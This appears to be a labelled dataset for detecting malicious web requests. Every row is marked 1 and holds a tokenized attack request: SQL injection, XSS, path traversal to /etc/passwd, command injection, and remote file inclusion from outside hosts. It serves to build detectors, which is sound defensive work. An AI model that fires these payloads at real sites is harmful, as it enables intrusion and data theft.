sentences 	 labels
/ string / str =  $  ( echo srsafa )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo synsac )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  \r\n\r\n 	 1
/ string / strings / parameters = -2925 %  "  "  or make_set ( 9354 = 9354 , 7185 )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = "  ; echo uzgzpc $  (  ( 74 + 69 )  )  $  ( echo uzgzpc ) uzgzpc &  \r\n\r\n 	 1
/ cacti / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category /  \r\n\r\n 	 1
/ main . php ? stuff =  " ping \ x0b-w \ x0b7000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 | rem \ x0b  \r\n\r\n 	 1
/ javascript / base . exe  \r\n\r\n 	 1
/ launch . jsp ? nfuse_application =  > alert ( document . cookie )  ;  <  / script >  \r\n\r\n 	 1
/ cgi-bin / _head . php ? _zb_path =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = < div style =  "  " width :  expression ( alert (  ' xss '  )  )  ;  "  "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  where 2679 = 2679 or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  \r\n\r\n 	 1
/ string / strings / parameters = ) print (  ` echo qqgyps `  .  ` echo  $  (  ( 10 + 39 )  )  `  .  ` echo qqgyps `  .  ` echo qqgyps `  )  ;  \  \ qqgyps  \r\n\r\n 	 1
/ en-us / esmozg5d . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = -4728 "  "  )  )  as ndri where 3278 = 3278 or make_set ( 9354 = 9354 , 7185 )  --  \r\n\r\n 	 1
/ string / strings / parameters = -2979 '  )  )  as klou where 7092 = 7092 union all select 7092 , 7092 --  \r\n\r\n 	 1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  )  and make_set ( 8191 = 7813 , 7813 )  and  (  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / modo = registro & login = alexi & password = cuerda & nombre = donardo & apellidos = paracoll '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & email = filho @ encuentrodominios . is & dni = 01722111d & direccion = enric + granados + 137 ,  +  & ciudad = ruesca & cp = 47248 & provincia = alicante & ntc = 0825150389138142 & b1 = registrar  \r\n\r\n 	 1
/ javascript / _source . exe  \r\n\r\n 	 1
/ string / strings / parameters = < svg id = javascript : alert ( 1337 )  onload = location = id >  \r\n\r\n 	 1
/ string / modo = insertar +  & precio = 346 & b1 = confirmar  \r\n\r\n 	 1
/ string / strings / parameters = ' echo $ ifsfyuxpa $  (  ( 17 + 24 )  )  $  ( echo $ ifsfyuxpa ) fyuxpa '  \r\n\r\n 	 1
/ string / modo = registro & login = kui-soon & password = a2rava46e & nombre = palmira & apellidos = espasa + radillo & email = provine @ acchportugal . pm & dni =  +  & direccion = pl .  + merced ,  + 147 +  & ciudad = arags + del + puerto & cp = 17860 & provincia = valencia & ntc = 6653520296014464 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = |   [  3 -ne  $  ( echo ehxctp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ javascript / e . exe  \r\n\r\n 	 1
/ string / strings / parameters = -9531 '  )  )  )  union all select 4076 , 4076 #  \r\n\r\n 	 1
/ o35zot2r . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ azcrfs8d . kspx ?  < meta http-equiv = set-cookie content =  " testjpdr = 9205 "  >  \r\n\r\n 	 1
/ string / strings / parameters = -7514 %  "  "  )  )  )  or 2448 = 8797 #  \r\n\r\n 	 1
/ string / strings / parameters = \ x3csvg /  < svg / onload = alert (  )  /  /  >  \ x3e  \r\n\r\n 	 1
/ string / strings / parameters = -8651 "  "  )  where 8391 = 8391 union all select 8391 , 8391 #  \r\n\r\n 	 1
/ string / strings / parameters = < embed / code =  /  / goo . gl / nlx0p ?  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as rvli where 4427 = 4427 ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  \r\n\r\n 	 1
/ recordings / webadmin . php ? show =  / etc / passwd  \r\n\r\n 	 1
/ help . php ? q = ver & rem ;  \r\n\r\n 	 1
/ string / strings / parameters = < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  \r\n\r\n 	 1
/ en-us / account / smpwservicescgi . exe  \r\n\r\n 	 1
/ scripts / index . php ? src = 1 & _common = 1 & time = 1331919221 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = ' echo $ ifsjwhawx $  (  ( 24 + 49 )  )  $  ( echo $ ifsjwhawx ) jwhawx "  \r\n\r\n 	 1
/ string / modo = registro & login = schyndel & password = trufaldina & nombre = yadia & apellidos = puerta + garreta & email = fleur @ drae2 . kh & dni = 52864416c & direccion = parque + de + despeaperros ,  + 159 +  & ciudad = algerriany ?  set-cookie :  + tamper = 5765205567234876235 & cp = 47175 & provincia = zaragoza & ntc = 9535422521832781 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = -5757 %  "  "  )  or 6872 = 6872 and  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ script / _conf / core / common-tpl-vars . php ? confdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ?  ?  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  where 6634 = 6634 or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = < div style =  "  " behaviour :  url (  [ link to code ]  )  ;  "  "  >  \r\n\r\n 	 1
/ string / strings / parameters = ; echo $ ifstreosx $  (  ( 82 + 26 )  )  $  ( echo $ ifstreosx ) treosx  \r\n\r\n 	 1
/ 8t9v8k7x . pl ?  < meta http-equiv = set-cookie content =  " testhvje = 9403 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  ; begin dbms_lock . sleep ( 5 )  ;  end  \r\n\r\n 	 1
/ string / strings / parameters = & lt ; a href =  \  " http &  # 58 ;  /  / 66 &  # 46 ; 102 &  # 46 ; 7 &  # 46 ; 147 /  \  "  & gt ; xss & lt ;  / a & gt ;  \r\n\r\n 	 1
/ ygkjkngd . cgi ?  < meta http-equiv = set-cookie content =  " testnago = 4518 "  >  \r\n\r\n 	 1
/ javascript / course . exe  \r\n\r\n 	 1
/ string / strings / parameters = "  |   [  2 -ne  $  ( echo jyvqfk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ examples / jsp / num / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login  \r\n\r\n 	 1
/ main . php ? logout =  \ x0duname  > q49774432  #  \r\n\r\n 	 1
/ string / strings / parameters = -4428 )  or 3038 = 3038  \r\n\r\n 	 1
/ string / strings / parameters = -3933 %  "  "  )  )  or elt ( 8142 = 2978 , 2978 )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = ; echo skjoij $  (  ( 68 + 83 )  )  $  ( echo skjoij ) skjoij  \r\n\r\n 	 1
/ scripts / livre_include . php ? no_connect = lol & chem_absolu = http :  /  / xxxxxx .  /  \r\n\r\n 	 1
/ hw3 . cgi ? daysonly = 0 )  . system (  ' id '  )  .  (  \r\n\r\n 	 1
/ main . php ? stuff =  "  & del ; q86839174 & rem ;  \r\n\r\n 	 1
/ l4fz1dqw . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = < script a =  `  >  `  src =  " http :  /  / xss . cx / xss . js "  >  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = d :  / inetpub / wwwroot / global . asa  \r\n\r\n 	 1
/ rpxyx07v . jspa ?  < meta http-equiv = set-cookie content =  " testbnli = 1975 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ cgi-bin / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  \r\n\r\n 	 1
/ scriptpath / footers . php ? tinybb_footers = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  \r\n\r\n 	 1
/ string / strings / parameters = -9120 '  )  )  or 8571 = 8571 --  \r\n\r\n 	 1
/ snippetmaster / includes / vars . inc . php ? _session [ script_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  "  " nzgn "  "  =  "  " nzgn  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  ; waitfor delay  ' 0 : 0 : 5 '  and  ' gsvt '  =  ' gsvt  \r\n\r\n 	 1
/ string / modo = registro & login = ruzycki & password = aviso & nombre = hugo & apellidos = estrada & email = burston_autin @ 943 . py & dni = 26397342n & direccion = c /  + queralbs ,  + 185 + 10-g & ciudad = santa + eulalia & cp = 10828 & provincia = valencia |  & ntc = 0317961350004584 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select mhfn where 2425 = 2425 ; select count (  *  )  from generate_series ( 1 , 5000000 )  )  +  '  \r\n\r\n 	 1
/ string / strings / parameters = *  & apos ;  \r\n\r\n 	 1
/ string / modo = registro & login = philips & password = balconaje & nombre = hansel & apellidos = ponseti + vilarrasa & email = zonis-paola @ interanuncios . hk & dni = 52864416c & direccion = calle + el + labrador + s / n + 13c & ciudad = san + isidro & cp = 04868 & provincia = cuenca & ntc = 219909426286098a & b1 = registrar  \r\n\r\n 	 1
/ recordings / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select  ' vtyw '  where 7950 = 7950 order by 1 --  \r\n\r\n 	 1
/ string / modo = registro & login = ballarte & password = mist66l & nombre = zorella & apellidos = morera & email = cossar @ asdn . be & dni = 36813756w & direccion = calle + alvarez + de + castro + 197 ,  +  & ciudad = vila-real & cp = 19160 & provincia = jan & ntc = 966948476857778 & b1 = registrar  \r\n\r\n 	 1
/ examples / jsp / cal / sawmill6cl . exe ? ho +  { complete_version }  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 1
/ pxagj7n7 . asp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / modo = registro & login = kolahi45 & password = o5 $ 57t4 & nombre = segismundo & apellidos = torr & email = unkel-richler @ nanogenerador . bu & dnia = 62093064x & direccion = calle + puerto + oncala ,  + 80 ,  + 7 ? g & ciudad = almazul & cp = 20495 & provincia = navarra & ntc = 9824241120494731 & b1 = registrar  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / core / editor . php ? editor_insert_bottom =  / etc / passwd  \r\n\r\n 	 1
/ string / modo =  ?  & precio = 1510 & b1 = confirmar  \r\n\r\n 	 1
/ string / strings / parameters = 1 where 5466 = 5466 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  and elt ( 4249 = 4249 , 7259 )  \r\n\r\n 	 1
/ string / strings / parameters = 1 ,  ( select  ( case when  ( 6857 = 7623 )  then 1 else 6857 *  ( select 6857 from information_schema . character_sets )  end )  )  \r\n\r\n 	 1
/ top . php ? stuff = ping ; -w ; 7000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  \r\n\r\n 	 1
/ qhvu0pdg . jsp ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  \r\n\r\n 	 1
/ cgi / texis . exe / junk  \r\n\r\n 	 1
/ string / modo = registro & login = bonnar & password = perillana & nombre = benito & apellidos = estruga + barrozzi & email = offerall @ eonon . com . ci & dni = 78627299m & direccion = poetisa + rosalia + de + castro ,  + 41 ,  + 3 ? e & ciudad = valhermoso + de + la + fuente & cp = 24174 & provinciaa = cuenca & ntc = 3588478670456559 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ewgaea )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ cacti / webdist . cgi ? distloc =  ; id  \r\n\r\n 	 1
/ i686v90l . html ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  \r\n\r\n 	 1
/ string / strings / parameters = -1048 %  "  "  or 3038 = 3038  \r\n\r\n 	 1
/ administrator / components / com_clickheat / includes / heatmap / main . php ? mosconfig_absolute_path = xxpathxx  \r\n\r\n 	 1
/ gpb / include / gpb . inc . php ? root_path = xxpathxx ?  \r\n\r\n 	 1
/ string / modo = registro & login = izaak & password = calibracin & nombre = hortencia & apellidos = turet + maiorana & email = hannon . white8 @ mtos . st & dni = 88648013x & direccion = c /  + ajuntament + s / n +  & ciudad = santa + mara + del + titar & cp = 50491 & provincia = ourense <  !  --  # include + file =  " archivo_secreto "  +  --  >  & ntc = 6434125672280477 & b1 = registrar  \r\n\r\n 	 1
/ string / modo = insertar & precio = 1825 & b1 = pasar + por + caja /  \r\n\r\n 	 1
/ string / id = 2 /  & nombre = queso + manchego & precio = 39 & cantidad = 98 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ phpmyadmin / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f  \r\n\r\n 	 1
/ album . php ? albumid = 1 ' 414095588137  \r\n\r\n 	 1
/ string / strings / parameters = | echo $ ifsyrtpvw $  (  ( 55 + 57 )  )  $  ( echo $ ifsyrtpvw ) yrtpvw "  \r\n\r\n 	 1
/ main . php ? logout =  " ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 | rem \ x0b  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select wgmn where 4368 = 4368 and 7859 = 6151 )  +  '  \r\n\r\n 	 1
/ mailarticle . php ? id =  ' union select 0 , 0 , 0 , 0 , 0 , 0 , username , password , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 from cc_admin /  *  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 20 + 72 + 75 + 6e + 20 + 69 + 6e + 20 + 44 + 4f + 53 + 20 + 6d + 6f + 64 + 65 + 24 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 +  +  >  > esbq  \r\n\r\n 	 1
/ string / modoa = registro & login = shiranth5 & password = petal9192 & nombre = nelma & apellidos = rayo + jaln & email = dubucourt-geoffrey @ intercambioenlaces . name & dni = 75767112y & direccion = plaa + d '  + espanya + 36 + 6-e & ciudad = penagos & cp = 10240 & provincia = mlaga & ntc = 1634165251818381 & b1 = registrar  \r\n\r\n 	 1
/ scripts / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331908736 , 1948616015  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  and  ( 8853 = 9924 )  * 9924 and  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ scripts / search . php ? getdate =  .  / templates / default / admin . tpl  \r\n\r\n 	 1
/ scripts / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331918989 '  )  <  / script >  \r\n\r\n 	 1
/ main . php ? stuff =  | ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  \r\n\r\n 	 1
/ top . php ? stuff =  "  ; uname  > q35544877  #  \r\n\r\n 	 1
/ components / com_mospray / scripts / admin . php ? basedir =  @ rfiurl ? basedir =  @ rfiurl ?  & cmd = id  \r\n\r\n 	 1
/ ht8pn8uq . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = -9509 )  union all select 1193 , 1193 , 1193 #  \r\n\r\n 	 1
/ string / strings / parameters = -3861 '  )  as zmja where 4036 = 4036 or 9323 = 9323 #  \r\n\r\n 	 1
/ cacti / directory . php ? dir =  ; cat  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = -5058 %  '  union all select 6789 , 6789 , 6789 , 6789 , 6789 #  \r\n\r\n 	 1
/ string / strings / parameters = < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  ' novq '  =  ' novq  \r\n\r\n 	 1
/ javascript / index_1 . exe  \r\n\r\n 	 1
/ string / modo = insertar & precio = 5003 & b1 = confirmar /  \r\n\r\n 	 1
/ script / ident / loginmodif . php ? path_inc = http :  /  / cirt . net / rfiinc . txt ?  \r\n\r\n 	 1
